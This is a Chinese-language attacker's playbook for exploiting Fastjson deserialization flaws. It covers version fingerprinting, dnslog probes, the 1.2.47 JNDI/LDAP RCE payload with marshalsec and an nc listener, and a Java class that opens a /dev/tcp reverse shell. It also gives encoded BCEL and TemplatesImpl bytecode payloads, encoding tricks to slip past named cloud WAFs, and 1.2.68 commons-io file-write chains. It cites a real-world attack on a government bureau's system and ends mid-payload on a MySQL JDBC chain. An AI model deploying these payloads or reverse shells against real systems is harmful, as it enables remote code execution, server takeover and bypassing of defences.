# Fastjson利用总结


# 0X01 漏洞利用

## 探测fastjson

**对于有错误回显的情况**

使用`{"@type": "java.lang.AutoCloseable"`或者 `"{"a":x"`通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了

<img src="https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png" title="" alt="image.png" data-align="center">

<img src="https://s2.loli.net/2022/02/20/pEBv8NlifAXWRQ2.png" title="" alt="" data-align="center">

**无回显使用dnslog探测POC：**

```json
1. {"@type":"java.net.InetSocketAddress"{"address":,"val":"sq20yi.ceye.io"}}
2. {"@type":"java.net.Inet4Address","val":"sq20yi.ceye.io"}
3. {"@type":"java.net.Inet6Address","val":"sq20yi.ceye.io"}
4. {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://sq20yi.ceye.io"}}""}
5. Set[{"@type":"java.net.URL","val":"http://sq20yi.ceye.io"}]
```

抓包修改请求体

![image.png](https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png)

==dnslog==收到请求信息就代表使用了==fastjson==来解析的json数据

![image.png](https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png)

## 验证是否存在漏洞

fastjson1.2.47以后的版本利用 条件都比较苛刻，所以我们一般都会采用经典的1.2.47的POC，

无限制RCE，通杀≤1.2.47的所有版本。47版本poc如下

`{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://47.119.161.84:1389/Exploit","autoCommit":true}}}`

1. 在我们的云服务器上开启LDAP服务：`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.119.161.84/#Exploit`
2. 同目录开启http服务：`python3 -m http.server 80`
3. NC监听：`nc -lvvp 8888`
4. javac编译下面恶意类，将编译好的`Exploit.class`文件放在http同目录下

```java
public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx.xxx.xxx.xxx/8888 0>&1");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
```

发送payload，getshell

![image.png](https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png)

**实战基本是直接拿47版本的payload打dnslog，dnslog有反应就继续，没反应再一步一步验证。 🙃效率高很多。**

## 绕过高版本jdk对jndi注入的限制

> 高版本jdk默认禁止jndi注入。

> 所以基于jndi+RMI的利用需要JDK版本<=6u141、7u131、8u121，

> 基于jndi+LDAP利用的JDK版本<=6u211、7u201、8u191、11.0.1

### **如何判断服务是否使用高版本jdk**

低版本jdk的jndi注入（`jdk1.8.45`）：

ldap收到请求重定向到[http://47.119.161.84:888/Exploit.class](http://47.119.161.84:888/Exploit.class)。 再发起http请求加载Exploit.class(弹计算器)

![image.png](https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png)

高版本jdk的jndi注入（jdk1.8.212）：

ldap服务收到了请求，可我们起的http服务却没有反应，也就访问不到我们的恶意类了。

![image-20220220011650815](https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png)

所以实战情况下遇到上述情况（**ldap服务收到信息，却没有http请求**）多半可以断定是采用高版本jdk。

### **绕过高版本jdk对jndi注入的限制**

绕过原理参考：[https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)

[https://www.mi1k7ea.com/2020/09/07/浅析高低版JDK下的JNDI注入及绕过](https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/)

**依赖受害者本地CLASSPATH中环境，利用受害者本地的Gadget进行攻击。**

`javax.el.ELProcessor`依赖于`tomcat8`

`com.ibm.ws.webservices.engine.client.ServiceFactory`依赖于`IBM WebSphere`

`com.ibm.ws.client.applicationclient.ClientJ2CCFFactory`依赖于`IBM WebSphere`

GitHub上的轮子：[https://github.com/veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi)

以实战为例：深圳地质局的fastjson

：**见视频** 😇

视频有些敏感，不公开了。

## fastjson不出网与命令回显

> 注：此攻击手法同样适用于高版本jdk下的利用

1.2.24版本的三个POC：

```json
1. 基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
{
        "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "_bytecodes":["poc_base64"],
        '_name':'a.b',
        '_tfactory':{ },
        "_outputProperties":{},
        "_name":"a",
        "_version":"1.0",
        "allowedProtocols":"all"
}
2.基于com.sun.rowset.JdbcRowSetImpl（JNDI，用的最多）

{
        "@type":"com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName":"ldap://localhost:1389/Exploit", 
        "autoCommit":true
}

3.基于org.apache.tomcat.dbcp.dbcp.BasicDataSource
{
    "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
    "driverClassLoader": {
        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "driverClassName": "$$BCEL$$$l$8b......"
}
```

其中基于其中1、3利用链都是基于java字节码，不需要出网。使用47版本的绕过方式（`java.lang.Class`）改造1、3两个poc，使他们适用于47以下的版本。

```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
        },
    "b": {
        "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "_bytecodes": ["poc_base64"],
        '_name': 'a.b',
        '_tfactory': {},
        "_outputProperties": {},
        "_name": "b",
        "_version": "1.0",
        "allowedProtocols": "all"
      }
}


{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A"
        }
    }: "x"
}


{
    "xx":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"
            }
        } : "xxx"
    }
}
```

限制：

第一个需要开启`Feature.SupportNonPublicField`，实战很难遇到。

第二个依赖于`tomcat（tomcat6、7：dbcp ； tomcat8：dbcp2）`且jdk版本≤8u251；

![image.png](https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png)

## 绕waf

不同与传统json标准，在fastjson中16进制是可以被解析的。它还支持在json语句中加入注释，单引号替换双引号，默认会去除键、值外的空格、`\b`、`\n`、`\r`、`\f`等等等。

如今市面上大部分waf只针对@type 和`com.sun.rowset.JdbcRowSetImpl` 进行检测，所以我们通过结合Unicode和16进制编码即可轻松绕过waf。

**以OPPO云和阿里云waf为例**

`{"name":{"@\u0074\u0079\u0070\u0065":/*asdasd*/\r\n"java.l\x61ng.Cl\x61ss","val":"com.sun.rowset.JdbcRo\x77\x53etImpl"},"x":{"@\u0074\u0079\u0070\u0065":"com.sun.rowset.Jd\x62\x63RowSetImpl","dataSourceName":"ldap://11.11.11.11:1389/Exploit","autoCommit":true}}}`

![image.png](https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png)

![image.png](https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png)

![image.png](https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png)

![image.png](https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png)

## fastjson1.2.68利用

和1.2.47版本的漏洞一样，68版本也是对checkAutoType()的的绕过，无需考虑fastjson的黑名单进行利用。

### 任意文件写入

参考：[https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg](https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg)

依赖于commons-io 2.0 - 2.6 的POC：

`{  "x":{    "@type":"com.alibaba.fastjson.JSONObject",    "input":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.ReaderInputStream",      "reader":{        "@type":"org.apache.commons.io.input.CharSequenceReader",        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"      },      "charsetName":"UTF-8",      "bufferSize":1024    },    "branch":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.output.WriterOutputStream",      "writer":{        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",        "file":"/tmp/pwned",        "encoding":"UTF-8",        "append": false      },      "charsetName":"UTF-8",      "bufferSize": 1024,      "writeImmediately": true    },    "trigger":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "is":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    },    "trigger2":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "is":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    },    "trigger3":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "is":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    }  }}`

依赖于commons-io 2.7 - 2.8.0 的POC：

`{  "x":{    "@type":"com.alibaba.fastjson.JSONObject",    "input":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.ReaderInputStream",      "reader":{        "@type":"org.apache.commons.io.input.CharSequenceReader",        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",        "start":0,        "end":2147483647      },      "charsetName":"UTF-8",      "bufferSize":1024    },    "branch":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.output.WriterOutputStream",      "writer":{        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",        "file":"/tmp/pwned",        "charsetName":"UTF-8",        "append": false      },      "charsetName":"UTF-8",      "bufferSize": 1024,      "writeImmediately": true    },    "trigger":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "inputStream":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    },    "trigger2":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "inputStream":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    },    "trigger3":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "inputStream":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    }  }`

本地windows测试第一次成功写入，后面的只创建了文件并没有写入，需要刷新缓存或者重启服务才行

![image.png](https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png)

### Mysql RCE

[https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg](https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg)

**BlackHat2021 腾讯玄武实验室的大佬公开了68版本mysql的利用链。配合恶意mysql服务端造成远程命令执行**

[https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat USA 2021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke&Expires=1629276415&Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D](https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat%20USA%202021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke&Expires=1629276415&Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D)

```csharp
5.1.x(SSRF)，5.1.11-5.1.48(反序列化链)
{
  "@type": "java.lang.AutoCloseable",
  "@type": "com.mysql.jdbc.JDBC4Connection",
  "hostToConnectTo": "127.0.0.1",
  "portToConnectTo": 3306,
  "info": {
    "user": "yso_CommonsCollections4_calc",
    "password": "pass",
    "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
    "autoDeserialize": "true",
    "NUM_HOSTS": "1"
  },
  "databaseToConnectTo": "dbname",
  "url": ""
}

6.0.2/6.0.3(反序列化)
{
